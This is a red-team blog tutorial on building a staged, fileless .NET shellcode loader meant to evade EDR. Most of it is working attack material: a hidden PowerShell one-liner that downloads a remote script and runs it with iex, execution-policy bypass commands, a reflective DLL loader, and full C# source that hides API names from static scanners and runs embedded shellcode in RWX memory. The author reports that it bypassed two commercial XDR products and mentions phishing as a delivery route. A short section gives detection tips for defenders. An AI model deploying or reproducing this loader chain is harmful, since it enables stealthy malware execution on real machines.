---
title:  How to Create a Staged In-Memory .NET Reflective Shellcode Loader
header:
  teaser: "/assets/images/reflectiveloader.png"
categories:
  - Fileless Techniques
tags:
  - reflective
  - .Net
  - shellcode loader
  - '2025'
  - g3tsyst3m
  - Stager
  - In-Memory
  - Windows 11
---

I've had a lot of questions get tossed around about EDR Bypass and Shellcode Loaders lately.  The familiar dilemma ends up as follows:

- Red teamer has a foothold on the machine with all necessary privs
- Red teamer drops their shellcode loader onto the desktop or whatever folder they choose
- EDR kicks in and removes it

That's really the gist of it.  So, with all these sophisticated Shellcode Loaders available via Github, why are they always being detected?  Well, in my personal opinion, I think EDR solutions are incredibly effective in detecting on-disk payloads.  However, I think that in-memory payloads are superior in their ability to evade EDR, IF you combine the right techniques.  Now, first and foremost, the method(s) I share with you today are NOT foolproof.  This is just what has worked for me over the years and as of right now, still works and that's after scanning the artifacts against Defender XDR and Sophos XDR, before being loaded into memory of course.  Would you like me to use other EDR solutions?  Sure, I'd love to test my code against CrowdStrike, etc.  Heck I even reached out to some of the big names stating my intention to help advertise their product on my blog if they let me do a trial.  Crickets 🦗  That's not a jab at these companies.  I totally get it.  But as a researcher, it's hard for me to purchase every single EDR solution ya know?  If you have thoughts/ideas/help you can toss my way please do.  I'd absolutely love to test my compiled artifacts against additional EDR solutions!  😸

Here's our Execution Workflow
-

> **Quick and Simple breakdown: This is a three-stage attack:**

- PowerShell stager downloads PS1 script
- PS1 script downloads .NET DLL and reflectively loads it
- .NET DLL performs the actual shellcode injection

> **More in-depth explanation on what's going on beneath the surface**

- Initial execution - This stager runs (often via phishing, macro, etc.)
- Download - Fetches the PowerShell script from a remote server
- Immediate execution - Runs the downloaded script directly in memory
- .NET loader deployment - The downloaded script (loadsc_dynamic2.ps1) downloads a .NET DLL (Our Shellcode Loader - ClassLibrary3.dll) as bytes and uses .NET reflection to load the assembly directly from memory without writing it to disk
- Shellcode Loader execution - The loaded .NET assembly then executes the shellcode loader / payload

> **Why this approach and Why is it so Effective?**

- **Fileless** - Nothing gets written to disk initially
- **Evasive** - Harder for endpoint protection to catch
- **Modular** - Easy to update the second stage remotely (In this example, it's loaded from a folder in one of my github repos 😺)
- **Legitimate tools** - Uses LOTL techniques / built-in Windows PowerShell and .NET

***The Stager***
-

```ps1
powershell -w h -c "iwr 'https://raw.githubusercontent.com/g3tsyst3m/undertheradar/refs/heads/main/loadsc_dynamic2.ps1' | iex"
```

This can be ran any way you like for your red team campaign.  It's a simple one-liner.  There are some caveats to this running as expected.  You will of course want to ensure you have Execution Policy set correctly to allow script execution:

```ps1
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
# or
Set-ExecutionPolicy Bypass -Scope CurrentUser
# or
Set-ExecutionPolicy Bypass -Scope Process
```

If you cannot or don't want to permanently change the execution policy, run your command like this:

```ps1
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iwr 'https://raw.githubusercontent.com/g3tsyst3m/undertheradar/refs/heads/main/loadsc_dynamic2.ps1' | iex"
```
This tells PowerShell to bypass the policy just for this session.

Now, let's review the code for the stager.  I intentionally did not include error checking as this is intended to work without any issues once executed within a red team campaign environment.  The full script, with error checking, will be available for folks interested if they're subscribed to me via ko-fi. 😸  This will do just fine for the purposes of this exercise though, so don't you worry!  Here's what we're doing in the script below:

- **For starters, we're defining a multiline PowerShell script and storing an entire PowerShell script inside the variable $code 😸**
- **We use `$webClient.DownloadData($url)` to download a custom-made, C# DLL file directly into memory as a byte array, stored in `$assemblyBytes`.**
- **We use `[System.Reflection.Assembly]::Load()` to load the raw byte array as a .NET assembly in memory, WITHOUT saving it to disk.  `$assembly` now represents the loaded DLL in memory.**
- **We specify the class (type) and method that we wish to execute:**
  - $typeName = 'ShellcodeRunner'
  - $methodName = 'ExecuteShellcode'
- **Get the type (class) object from the loaded assembly**
  - $type = $assembly.GetType($typeName)
    - Looks inside the loaded assembly for the type named "ShellcodeRunner".  If the type doesn’t exist, $type will be $null.
- **Get the method information for the method we want to invoke**
  - $methodInfo = $type.GetMethod($methodName, [System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::Static)
    - Looks for a public static method named "ExecuteShellcode" inside the $type.  The BindingFlags specify that the method should be public and static.
**- Invoke the method dynamically**
  - $methodInfo.Invoke($null, @())
    - Calls the method "ExecuteShellcode" on the type.
    - The first argument is $null because the method is static (no instance needed).
    - The second argument is an empty array @() since the method takes no parameters.
- **Lastly, run the entire script stored in $code!**
  - iex $code
    - iex (Invoke-Expression) executes the string stored in $code as PowerShell code.
    - This runs the whole process: download DLL → load it → invoke the shellcode execution method — all in memory.

```ps1
$code = @'
# Download the DLL as a byte array
$url = 'https://github.com/g3tsyst3m/undertheradar/raw/refs/heads/main/ClassLibrary3.dll'
$webClient = New-Object System.Net.WebClient
$assemblyBytes = $webClient.DownloadData($url)

# Load the assembly from the byte array
$assembly = [System.Reflection.Assembly]::Load($assemblyBytes)

# Define the type and method to invoke
$typeName = 'ShellcodeRunner'  # Replace with actual namespace and class name if needed
$methodName = 'ExecuteShellcode'  # Replace with actual method name

# Get the type from the assembly
$type = $assembly.GetType($typeName)

# Get the method to invoke
$methodInfo = $type.GetMethod($methodName, [System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::Static)

# Invoke the method
$methodInfo.Invoke($null, @())
'@

# Execute the dynamically generated code
iex $code
```

> In Summary

- Downloads a remote DLL file directly into memory
- Loads it as a .NET assembly without touching disk
- Finds a specific class and method inside that assembly that I custom named
- Invokes the method to execute the shellcode loader / shellcode execution,

All dynamically and stealthily via PowerShell in-memory execution.  😸

***The .NET DLL / Shellcode Loader***
-

This is fairly straight forward .NET DLL code.  I do some very rudimentary obfuscating of API names that way YARA and other static analysis tools don't see `CreateThread` and `VirtualAlloc` in the clear when running the strings command.  Check it out:

```ps1
strings C:\Users\g3tsyst3m\Documents\GitHub\elevationstation_local\ClassLibrary3\ClassLibrary3\bin\Debug\ClassLibrary3.dll
```

<img width="1437" height="752" alt="image" src="https://github.com/user-attachments/assets/2f554034-472a-433d-8b1a-6d095cc5bb9b" />

I also went with my own custom shellcode, NOT using MSFVENOM.  Check out my shellcoding and assembly series if you'd like to learn more!  This particular shellcode executes the Calculator via WinExec and then calls ExitThread:

```C#
    static readonly byte[] shellcode = new byte[]
    {
0x48,0x83,0xec,0x28,0x48,0x83,0xe4,0xf0,0x48,0x31,
0xc9,0x65,0x48,0x8b,0x41,0x60,0x48,0x8b,0x40,0x18,
0x48,0x8b,0x70,0x10,0x48,0x8b,0x36,0x48,0x8b,0x36,
0x48,0x8b,0x5e,0x30,0x49,0x89,0xd8,0x8b,0x5b,0x3c,
0x4c,0x01,0xc3,0x48,0x31,0xc9,0x66,0x81,0xc1,0xff,
0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,
0xc2,0x44,0x8b,0x52,0x14,0x4d,0x31,0xdb,0x44,0x8b,
0x5a,0x20,0x4d,0x01,0xc3,0x4c,0x89,0xd1,0x48,0xb8,
0x64,0x64,0x72,0x65,0x73,0x73,0x90,0x90,0x48,0xc1,
0xe0,0x10,0x48,0xc1,0xe8,0x10,0x50,0x48,0xb8,0x47,
0x65,0x74,0x50,0x72,0x6f,0x63,0x41,0x50,0x48,0x89,
0xe0,0x67,0xe3,0x20,0x31,0xdb,0x41,0x8b,0x1c,0x8b,
0x4c,0x01,0xc3,0x48,0xff,0xc9,0x4c,0x8b,0x08,0x4c,
0x39,0x0b,0x75,0xe9,0x44,0x8b,0x48,0x08,0x44,0x39,
0x4b,0x08,0x74,0x03,0x75,0xdd,0xcc,0x51,0x41,0x5f,
0x49,0xff,0xc7,0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x1c,
0x4d,0x01,0xc3,0x43,0x8b,0x04,0xbb,0x4c,0x01,0xc0,
0x50,0x41,0x5f,0x4d,0x89,0xfc,0x4c,0x89,0xc7,0x4c,
0x89,0xc1,0x4d,0x89,0xe6,0x48,0x89,0xf9,0xb8,0x61,
0x64,0x90,0x90,0xc1,0xe0,0x10,0xc1,0xe8,0x10,0x50,
0x48,0xb8,0x45,0x78,0x69,0x74,0x54,0x68,0x72,0x65,
0x50,0x48,0x89,0xe2,0x48,0x83,0xec,0x30,0x41,0xff,
0xd6,0x48,0x83,0xc4,0x30,0x49,0x89,0xc5,0x4d,0x89,
0xe6,0x48,0x89,0xf9,0x48,0xb8,0x57,0x69,0x6e,0x45,
0x78,0x65,0x63,0x00,0x50,0x48,0x89,0xe2,0x48,0x83,
0xec,0x30,0x41,0xff,0xd6,0x48,0x83,0xc4,0x30,0x49,
0x89,0xc6,0x48,0x83,0xc4,0x08,0xb8,0x00,0x00,0x00,
0x00,0x50,0x48,0xb8,0x63,0x61,0x6c,0x63,0x2e,0x65,
0x78,0x65,0x50,0x48,0x89,0xe1,0xba,0x01,0x00,0x00,
0x00,0x48,0x83,0xec,0x30,0x41,0xff,0xd6,0x31,0xc9,
0x41,0xff,0xd5
    };
```

And lastly, the C# DLL code, in full.  I won't be able to go through each line and explain this code in this post, but if you'd like to dive deeper with understanding how it all works, hit me up.  I don't meant to constantly advertise my membership offering, but I do think it's really helpful for folks that wish to take things further than what I capture in my blog.  Check out the link at the top-right corner of my blog for more info.  It looks like this: "Partner / Donate / Become a Member!".  Ok, let's go!

```C#
using System;
using System.Runtime.InteropServices;
//using System.Threading;

public class ShellcodeRunner
{
    // Define delegate for CreateThread
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr CreateThreadDelegate(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint INFINITE = 0xFFFFFFFF;

    static readonly byte[] shellcode = new byte[]
    {
0x48,0x83,0xec,0x28,0x48,0x83,0xe4,0xf0,0x48,0x31,
0xc9,0x65,0x48,0x8b,0x41,0x60,0x48,0x8b,0x40,0x18,
0x48,0x8b,0x70,0x10,0x48,0x8b,0x36,0x48,0x8b,0x36,
0x48,0x8b,0x5e,0x30,0x49,0x89,0xd8,0x8b,0x5b,0x3c,
0x4c,0x01,0xc3,0x48,0x31,0xc9,0x66,0x81,0xc1,0xff,
0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,
0xc2,0x44,0x8b,0x52,0x14,0x4d,0x31,0xdb,0x44,0x8b,
0x5a,0x20,0x4d,0x01,0xc3,0x4c,0x89,0xd1,0x48,0xb8,
0x64,0x64,0x72,0x65,0x73,0x73,0x90,0x90,0x48,0xc1,
0xe0,0x10,0x48,0xc1,0xe8,0x10,0x50,0x48,0xb8,0x47,
0x65,0x74,0x50,0x72,0x6f,0x63,0x41,0x50,0x48,0x89,
0xe0,0x67,0xe3,0x20,0x31,0xdb,0x41,0x8b,0x1c,0x8b,
0x4c,0x01,0xc3,0x48,0xff,0xc9,0x4c,0x8b,0x08,0x4c,
0x39,0x0b,0x75,0xe9,0x44,0x8b,0x48,0x08,0x44,0x39,
0x4b,0x08,0x74,0x03,0x75,0xdd,0xcc,0x51,0x41,0x5f,
0x49,0xff,0xc7,0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x1c,
0x4d,0x01,0xc3,0x43,0x8b,0x04,0xbb,0x4c,0x01,0xc0,
0x50,0x41,0x5f,0x4d,0x89,0xfc,0x4c,0x89,0xc7,0x4c,
0x89,0xc1,0x4d,0x89,0xe6,0x48,0x89,0xf9,0xb8,0x61,
0x64,0x90,0x90,0xc1,0xe0,0x10,0xc1,0xe8,0x10,0x50,
0x48,0xb8,0x45,0x78,0x69,0x74,0x54,0x68,0x72,0x65,
0x50,0x48,0x89,0xe2,0x48,0x83,0xec,0x30,0x41,0xff,
0xd6,0x48,0x83,0xc4,0x30,0x49,0x89,0xc5,0x4d,0x89,
0xe6,0x48,0x89,0xf9,0x48,0xb8,0x57,0x69,0x6e,0x45,
0x78,0x65,0x63,0x00,0x50,0x48,0x89,0xe2,0x48,0x83,
0xec,0x30,0x41,0xff,0xd6,0x48,0x83,0xc4,0x30,0x49,
0x89,0xc6,0x48,0x83,0xc4,0x08,0xb8,0x00,0x00,0x00,
0x00,0x50,0x48,0xb8,0x63,0x61,0x6c,0x63,0x2e,0x65,
0x78,0x65,0x50,0x48,0x89,0xe1,0xba,0x01,0x00,0x00,
0x00,0x48,0x83,0xec,0x30,0x41,0xff,0xd6,0x31,0xc9,
0x41,0xff,0xd5
    };

    public static void ExecuteShellcode()
    {

        string[] chars2 = { "V", "i", "r", "t", "u", "a", "l", "A", "l", "l", "o", "c" };
        string funcName2 = string.Concat(chars2);  // "VirtualAlloc"

        IntPtr hModule2 = GetModuleHandle("kernel32.dll");
        IntPtr pFunc2 = GetProcAddress(hModule2, funcName2);

        var VirtualAllocDelly = Marshal.GetDelegateForFunctionPointer<VirtualAllocDelegate>(pFunc2);

        // Allocate RWX memory
        IntPtr addr = VirtualAllocDelly(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (addr == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }

        // Copy shellcode into memory
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        // Create thread
        uint threadId;

        string[] chars = { "C", "r", "e", "a", "t", "e", "T", "h", "r", "e", "a", "d" };
        string funcName = string.Concat(chars);  // "CreateThread"

        IntPtr hModule = GetModuleHandle("kernel32.dll");
        IntPtr pFunc = GetProcAddress(hModule, funcName);

        var createThreadDelly = Marshal.GetDelegateForFunctionPointer<CreateThreadDelegate>(pFunc);




        IntPtr hThread = createThreadDelly(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("[-] CreateThread failed.");
            return;
        }

        // Wait for thread to finish
        WaitForSingleObject(hThread, INFINITE);
    }
}
```

Compile that and place it on a remote server that you have control over.  The highly unreliable method of testing this is using mine, which is already compiled, but I think it's better for learning purposes if you compiled and referenced your own 😸

After everything is in place and ready to go, we simply do the following and are greeted with our illustrious Windows Calculator! 😹

<img width="1486" height="283" alt="image" src="https://github.com/user-attachments/assets/263561a9-4926-4c2e-9fab-3ce1947f8b99" />

Powershell is minimized/hidden and all that remains is our ever faithful calc

<img width="1155" height="891" alt="image" src="https://github.com/user-attachments/assets/023bbaa0-499a-4759-9207-20224f78f51a" />

***Blue Team Tips***
-

**Check the powershell process for artifacts:**

<img width="687" height="55" alt="image" src="https://github.com/user-attachments/assets/d31df526-07e8-4f91-b788-19a19e3446f8" />

**Notice how my loaded .NET assembly does NOT have a c:\WINDOWS path appended to it, nor does it have any familiar flags.**

<img width="1493" height="309" alt="image" src="https://github.com/user-attachments/assets/c1e4d281-0c16-43f8-9cc0-9519d3256dff" />

**Check the powershell process(es) for RWX memory with shellcode artifacts:**

<img width="1300" height="677" alt="image" src="https://github.com/user-attachments/assets/73e8ec3b-2823-41c9-8d1f-c2cc26b217fd" />

There's also tons of evidence contained in memory for strings I used and even the clear-text code still left resident in memory 😸

<img width="1085" height="738" alt="image" src="https://github.com/user-attachments/assets/e06d9e7d-9863-4928-9f17-016eb1a78a97" />

Those are just a few tips.  There's tons of more in-depth Blue Team tricks and tactics to tackle this.  Trust me.  For now, we settle for this victory of bypassing Windows Defender XDR and Sophos XDR 😸  However!  Shoutouts to ANY.RUN, as it DID notice suspicious activity
That's it for me. Hope this made sense and helped. Later everyone!

***ANY.RUN Sandboxing***
-

<img width="1218" height="824" alt="image" src="https://github.com/user-attachments/assets/9cb91221-231d-40c0-aad2-0263a9e4761e" />

<img width="798" height="646" alt="image" src="https://github.com/user-attachments/assets/2554b11f-a586-481f-9506-43a99b648f62" />

<img width="792" height="637" alt="image" src="https://github.com/user-attachments/assets/287f139c-4c28-4f26-9087-404965d31064" />

[Full Sandbox Analysis](https://app.any.run/tasks/20f5caeb-d6be-4336-b958-bf5d2e797ba7)

<div style="text-align: right;">
Sponsored by:<br>
<img src="https://github.com/user-attachments/assets/111a0bb6-66e1-43b0-9a0a-5ce093f4b65e" alt="Sponsor logo" style="max-width: 200px;">
</div>

